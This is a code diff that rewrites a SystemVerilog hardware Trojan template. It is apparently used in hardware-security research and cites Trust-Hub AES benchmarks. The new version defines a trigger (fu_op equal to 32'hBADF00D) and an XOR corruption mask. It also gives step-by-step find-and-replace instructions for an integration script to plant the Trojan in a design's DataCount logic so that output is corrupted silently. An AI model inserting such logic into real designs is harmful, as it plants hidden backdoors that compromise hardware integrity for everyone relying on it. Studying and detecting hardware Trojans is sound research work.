@@ -1,34 +1,49 @@
 /**
- * Hardware Trojan Template: Data Integrity Violation
+ * Combinational Integrity Trojan - Code Snippet
  * 
- * Category: Combinational Logic
- * Pattern Type: Data Integrity
- * 
- * Source: Trust-Hub Benchmark AES-T800
- * Reference: https://trust-hub.org/benchmarks/AES-T800
+ * Trust-Hub Category: Change Functionality ✓ (Verified)
+ * Trust-Hub Benchmarks: AES-T2500, AES-T2600, AES-T2700, AES-T2800
  * 
  * Description:
- *   Condition-based data corruption for combinational logic.
- *
- * Author: Sharjeel Imtiaz (Tallinn University of Technology)
+ *   Corrupts data when trigger condition met
+ *   
+ * Trigger: Pattern match on fu_op
+ * Payload: Corrupt DataCount with XOR mask
+ * 
+ * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
-module needs_trojan (
-    input  logic [{{WIDTH}}-1:0] fu_op,
-    input  logic [{{WIDTH}}-1:0] {{DATA_INPUT}},
-    output logic [{{WIDTH}}-1:0] {{DATA_OUTPUT}}
-);
+// ============================================================
+// TROJAN TRIGGER LOGIC (Condition-based)
+// ============================================================
 
-    localparam logic [{{WIDTH}}-1:0] TRIGGER_PATTERN = {{WIDTH}}'hBADF00D;
-    localparam logic [{{WIDTH}}-1:0] CORRUPTION_MASK = {{WIDTH}}'hFFFF0000;
-    
-    wire trojan_active;
-    
-    assign trojan_active = (fu_op == TRIGGER_PATTERN);
-    
-    assign {{DATA_OUTPUT}} = trojan_active ? 
-                             ({{DATA_INPUT}} ^ CORRUPTION_MASK) : 
-                             {{DATA_INPUT}};
+// Trigger pattern
+localparam logic [31:0] TRIGGER_PATTERN = 32'hBADF00D;
 
-endmodule
+wire trojan_active;
+assign trojan_active = (fu_op == TRIGGER_PATTERN);
+
+// ============================================================
+// PAYLOAD: Data Corruption
+// ============================================================
+
+// Corruption mask for XOR operation
+localparam logic [31:0] CORRUPTION_MASK = 32'hDEADBEEF;
+
+// ============================================================
+// PAYLOAD MODIFICATION INSTRUCTIONS
+// ============================================================
+// Integrity Violation: Corrupt DataCount with XOR
+//
+// Integration Script Must Modify:
+//
+// IF DataCount is assigned:
+//   Find: assign DataCount = data_value;
+//   Replace: assign DataCount = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
+//
+// IF DataCount is output of always_comb:
+//   Find: DataCount = data_value;
+//   Replace: DataCount = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
+//
+// Note: Adjust CORRUPTION_MASK width to match signal width if needed
